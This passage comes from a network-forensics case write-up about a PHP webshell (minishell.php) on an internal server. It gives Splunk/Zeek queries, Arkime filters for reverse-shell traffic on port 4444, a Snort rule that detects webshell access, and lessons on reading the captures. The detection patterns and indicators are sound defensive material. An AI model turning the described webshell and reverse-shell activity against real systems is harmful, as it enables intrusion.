- **EXTERNAL MACHINES** — only 82.98.86.178: not C2, but a reliable clue for spotting minishell.php. TeamViewer and No-IP were left out: no evidence links them to the attack.
- `nc ... 5555` and the pre-existing SSH session cannot be finished from the network, so they are marked "host check required". Initial access is "Not Found" with the reasons.

---

## Copy-ready queries { #query-sheet }

**Splunk (Zeek)** — add `pcap_case="<case>"` if several PCAPs are loaded.

```spl
index=zeek | stats count AS events min(ts) AS first max(ts) AS last BY sourcetype | eval first=strftime(first, "%Y-%m-%d %H:%M:%S"), last=strftime(last, "%Y-%m-%d %H:%M:%S") | sort - events
index=zeek sourcetype=zeek:conn | where cidrmatch("10.0.0.0/8", id_orig_h) OR cidrmatch("172.16.0.0/12", id_orig_h) OR cidrmatch("192.168.0.0/16", id_orig_h) | stats count AS conns dc(id_resp_h) AS dests BY id_orig_h | sort - conns
index=zeek sourcetype=zeek:conn | stats count AS conns sum(orig_bytes) AS sent sum(resp_bytes) AS recv min(ts) AS first BY id_resp_h id_resp_p service | eval first=strftime(first, "%H:%M:%S") | sort first | where NOT cidrmatch("192.168.0.0/16", id_resp_h)
index=zeek sourcetype=zeek:dns | stats count values(answers) AS answers min(ts) AS first BY query | eval first=strftime(first, "%H:%M:%S") | sort first
index=zeek sourcetype=zeek:weird | stats count BY name | sort - count
index=zeek sourcetype=zeek:http | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h method host uri status_code user_agent referrer resp_mime_types
index=zeek sourcetype=zeek:conn (id_resp_p=4444 OR id_resp_p=5938) | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_orig_h id_orig_p id_resp_h id_resp_p conn_state orig_bytes resp_bytes duration
index=zeek sourcetype=zeek:conn id_orig_h=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time id_resp_h id_resp_p service conn_state orig_bytes resp_bytes
index=zeek sourcetype=zeek:files rx_hosts=192.168.1.100 | sort ts | eval time=strftime(ts, "%H:%M:%S") | table time tx_hosts rx_hosts mime_type filename seen_bytes md5
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 | stats min(ts) AS first count BY method uri | eval first=strftime(first, "%H:%M:%S") | sort first | head 5
index=zeek sourcetype=zeek:http id_resp_h=192.168.1.100 uri="/minishell.php*"
```

**Arkime**

```text
ip.src == 192.168.1.100 && port.dst == 4444
ip.src == 192.168.1.100 && ip.dst == 192.168.1.101 && port.dst == 4444
ip.dst == 192.168.1.100 && http.method == POST
ip.dst == 192.168.1.100 && http.uri == *cmdexe*
ip.dst == 192.168.1.100 && port.dst == 55555 && http.uri == *minishell.php*
```

**CyberChef**

```text
Gunzip  (→ Render HTML)
Extract Files (GZIP)  →  Gunzip        ← when only Destination Raw is available
```

**Snort**

```text
alert tcp $HOME_NET any -> $HOME_NET 55555 (msg:"minishell.php webshell access - Sung"; content:"minishell.php"; nocase; sid:1000031; rev:1;)
```

---

## Lessons { #lessons }

1. **Not every PCAP is a malware infection.** Here a person drove a webshell from a browser; the "victim" is the server, not the busy PC.
2. **Check capture direction first.** `possible_split_routing` / `data_before_established` + recv 0 = one-way capture, not exfil.
3. **Read the Referer.** It showed that 82.98.86.178 and code.jquery were page resources of the webshell, not C2.
4. **conn_state tells success.** S0 = nobody answered; SF + long duration + small/large byte split = a working interactive shell.
5. **Match the HTTP request to the connection by the second.** `my_ip=192.168.1.101` at 09:56:35 = the SF connection at 09:56:35.
6. **OTH means "started before the capture".** A pre-existing SSH session is a lead for initial access.
7. **Known hashes are worth recognising.** `5f4dcc3b5aa765d61d8327deb882cf99` = MD5 of `password`.
8. **TTL hints the OS.** 128 Windows, 64 Linux.
9. **`cmdexe` is a variable name, not `cmd.exe`.** Read URLs as `name=value` pairs.
10. **Write down what the network cannot show.** `nc` to itself, how the webshell got there → host check.

## References { #references }

- [BEGUILESOFT — HawkEye over FTP](beguilesoft-hawkeye-ftp-exfil.md) (same Splunk baselining, explained line by line)
- [Playbook: web shell / server](../playbooks/webshell-server.md) · [Playbook: lateral movement](../playbooks/lateral-domain.md)
- [Zeek conn.log](../../network/zeek/conn-log.md) · [http.log](../../network/zeek/http-log.md) · [files.log](../../network/zeek/files-log.md)
- [SPL cheat sheet](../splunk/spl-cheatsheet.md) · [Arkime search syntax](../../network/arkime/search-syntax.md)
- [Night Dew, second pass — Snort test guide](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test)
